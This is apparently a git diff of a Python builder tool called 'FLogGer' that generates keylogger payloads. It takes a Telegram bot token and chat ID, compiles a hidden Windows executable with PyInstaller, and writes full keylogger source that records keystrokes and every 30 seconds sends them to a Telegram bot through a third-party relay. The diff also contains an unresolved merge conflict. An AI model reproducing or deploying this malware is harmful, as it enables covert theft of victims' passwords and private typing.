@@ -1,9 +1,8 @@
+#!/usr/bin/env python
 import os
 from colorama import Fore
 import time
 import platform
-from rich.console import Console
-from rich.table import Table
 
 filePath = __file__
 filePath = list(filePath)
@@ -23,24 +22,8 @@ filePath = filePath[0]+'/'
 login = '0'
 trojanData = {'token': None, 'chatId': None}
 payloadName = 'file'
-Red = Fore.RED
-Blue = Fore.BLUE
-White = Fore.WHITE
-Green = Fore.GREEN
-Yellow = Fore.YELLOW
-Cyan = Fore.CYAN
-inputICon = (Green+'=-=>  '+White)
 
-iconName = Green+'''
-                        _____ _                 ____           
-                        |  ___| |    ___   __ _ / ___| ___ _ __ 
-                        | |_  | |   / _ \ / _` | |  _ / _ \ '__|
-                        |  _| | |__| (_) | (_| | |_| |  __/ |   
-                        |_|   |_____\___/ \__, |\____|\___|_|   
-                                           |___/                           
-'''
-
-helpMessage = Green+'''
+helpMessage = '''
     ╔════════════════════════════════════════════════════════════════════════════════════╗
     ║  -bt     Telgram Bot TOKEN < -bt 1313131313:qwwwet45gdfg3dfhdsdkwsm9mfks9edjdls >  ║
     ║  -ci     Telgram Chat Id < -ci 121212121 >                                         ║
@@ -50,44 +33,45 @@ helpMessage = Green+'''
     ║  -h      Help                                                                      ║
     ║  -e      Exit                                                                      ║
     ╚════════════════════════════════════════════════════════════════════════════════════╝
-'''+White
-
-compilerMessage = Green+'''
-    ╔════════════════════════════════════════════════════════════════════════════════════╗
-    ║  ?       Help                                                                      ║
-    ║  1       exe File (windows)                                                        ║
-    ║  2       sh File (linux)                                                           ║
-    ║  B       Back                                                                      ║
-    ║  E       Exit                                                                      ║
-    ╚════════════════════════════════════════════════════════════════════════════════════╝
-'''+White
+'''
 
 # Def
     
 def ToExe():
     os.system('pip install pyinstaller')
-    print(Green+'pyinstaller install'+White)
+    print('pyinstaller install')
     os.system(f'cd {filePath}/ && mkdir payload && cd payload && mkdir tmp && dir')
-    print(Green+f'your File Path: {filePath}'+White)
-    time.sleep(1)
+    print(Fore.BLUE+filePath+Fore.RED)
+    time.sleep(3)
     os.system(f'pyinstaller --onefile -c --distpath {filePath}/payload --workpath {filePath}/payload/tmp {payloadName}.py -w ')
     open(f'{payloadName}.py', 'w')
-    print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour payload is in '+Green+f'{filePath}payload/{payloadName}.exe'+' directory\n════════════════════════════════════════════════════════════════════════════════════')
+    print (Fore.RED+'=====================================================================\n'+Fore.GREEN+'your payload is in '+Fore.RED+f'{filePath}payload/{payloadName}.exe'+Fore.GREEN+' directory'+Fore.RED+'\n=====================================================================')
+
+    
 
 
 def Compiler():
-
+    compilerMessage = '''
+-------------------------------------------------------------------------------------
+-w      exe File (windows)
+-l      sh File (linux) 
+-h      Help
+-b      Back
+-e      Exit
+-------------------------------------------------------------------------------------    
+'''
     token = trojanData['token']
     chatId = trojanData['chatId']
     
     if trojanData['token'] == None or trojanData['chatId'] == None:
-        print(White+f'bot token set ==> {token}\nchat Id set ==> {chatId}\n'+Red+'Fields should not be empty\ntry again\n'+White)
+        print(
+            f'bot token set ==> {token}\nchat Id set ==> {chatId}\nFields should not be empty\ntry again\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=')
         return
     
     
-    print(Cyan+compilerMessage)
+    print(Fore.CYAN+compilerMessage)
     while True:
-        workSub = str(input(inputICon))
+        workSub = str(input(Fore.RED+'==> '))
         if workSub == '':
             workSub = workSub.split()
             workSub.append('0')
@@ -96,7 +80,7 @@ def Compiler():
         
         os.system('cd payload')
         
-        if workSub[0] == '1':
+        if workSub[0] == '-w':
             x = input('Hide After Start y/n? ( default y ) ')
             if x == '':
                 x = x.split()
@@ -115,37 +99,31 @@ def Compiler():
             file.close()
             ToExe()
             
-        elif workSub[0] == '2':
+        elif workSub[0] == '-l':
             file = open(f'{payloadName}.sh', 'w')
             file.write(
             f"#!/usr/bin/env python\nfrom pynput import keyboard\nimport time\nimport requests\ndef HadnlerHTTP(botMessage):\n    botUrl = (f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chatId}&text={{botMessage}}')\n    myData={{'UrlBox':botUrl,'AgentList':'Google Chrome','VersionsList':'HTTP/1.1','MethodList':'GET'}}\n    http = requests.post('https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx',data=myData)\ntry:\n    f = open('keyLogger.txt', 'x')\n    f.close()\nexcept:\n    pass\ntimeSend,startTime = time.time(),time.time()\ndef HandlerRemove(inputKey, value):\n    inputKey = str(inputKey)\n    log = inputKey.split(value)\n    if log[0] == '':\n        log = str(log[1])\n    else:\n        log = str(log[0])\n        log = f' *{{log}}* '\n    return log\ndef SetKeyboardLog(inputKey):\n    global startTime , timeSend\n    if (timeSend+30) <= time.time():\n        file = open('keyLogger.txt', 'r')\n        filedata = file.read()\n        try:\n            HadnlerHTTP(str(filedata))\n            file.close()\n            file = open('keyLogger.txt', 'w')\n            file.close()\n        except :\n            pass\n        file.close()\n        timeSend = time.time()\n    file = open('keyLogger.txt', 'a')\n    if (startTime + 15) <= time.time():\n        startTime = time.time()\n        writeTime = time.ctime(startTime)\n        tMessage=(f'''\n<<time ==> {{writeTime}}>>\n''')\n        file.write(tMessage)\n    if str(inputKey) == 'Key.space' :\n        inputKey = ' '\n    x = list(str(inputKey))\n    if len(x) == 3 :\n        inputKey = str(x[1])\n    file.write(str(inputKey))\n    file.close\ndef LoggerStarter():\n    with keyboard.Listener(on_press=SetKeyboardLog) as lop:\n        lop.join()\nLoggerStarter()")
             file.close()
-            print (White+'════════════════════════════════════════════════════════════════════════════════════\nyour file is in '+Green+f'{filePath}{payloadName}.sh'+' directory\n════════════════════════════════════════════════════════════════════════════════════')
-
+            print(Fore.BLUE+f"your file path ==> {filePath}/{payloadName}.sh")
             
-        elif workSub[0] == '?':
-            print(compilerMessage)
+        elif workSub[0] == '-h':
+            print(Fore.CYAN+compilerMessage)
             
-        elif workSub[0] == 'B':
+        elif workSub[0] == '-b':
             global login
             login = '0'
             WorkSubmit()
         
-        elif workSub[0] == 'E':
+        elif workSub[0] == 'e':
             exit()
             
         else :
-            print(Red+'commend not found'+White)
-            print(compilerMessage)
+            print(Fore.RED+'commend not found')
         
         
 def WorkSubmit():
     global login
     if login == '0':
-<<<<<<< HEAD
-        print(iconName)
-        print(helpMessage)
-=======
         print(Fore.RED+'''
                         _____ _                 ____           
                         |  ___| |    ___   __ _ / ___| ___ _ __ 
@@ -155,11 +133,10 @@ def WorkSubmit():
                                         |___/                           
 '''+Fore.WHITE)
         print(Fore.CYAN+helpMessage)
->>>>>>> parent of 40d1bc3 (FLogGer v1.0.1)
     else : 
         pass
     login = '1'
-    workSub = str(input(inputICon))
+    workSub = str(input(Fore.RED+'==> '))
     
     if workSub == '':
         workSub = workSub.split()
@@ -187,20 +164,7 @@ def WorkSubmit():
             workSub[0] == '0'
         
         elif workSub[0] == '-o' :
-            table = Table(title='Pyload Data')
-            rows = [
-                [trojanData['token'],trojanData['chatId'],payloadName],
-            ]
-            columns = [' Bot Token ', ' Chat ID ', ' Payload Name ']
-
-            for column in columns:
-                table.add_column(column)
-
-            for row in rows:
-                table.add_row(*row, style='bright_green')
-
-            console = Console()
-            console.print(table)
+            print(Fore.RED+f'=--------------------------------=\n'+Fore.WHITE+f'payload name is : {payloadName}\nbot token is : {trojanData["token"]}\nchat Id is : {trojanData["chatId"]}\n'+Fore.RED+'=--------------------------------='+Fore.WHITE)
             workSub[0] == '0'
             
         elif workSub[0] == '-s':
@@ -208,7 +172,7 @@ def WorkSubmit():
             workSub[0] == '0'
 
         elif workSub[0] == '-h':
-            print(helpMessage)
+            print(Fore.CYAN+helpMessage)
             workSub[0] == '0'
 
         elif workSub[0] == '-e':
@@ -219,7 +183,6 @@ def WorkSubmit():
 
         else:
             print(Fore.RED+'commend not found')
-            print(helpMessage)
 
 while True:
     WorkSubmit()
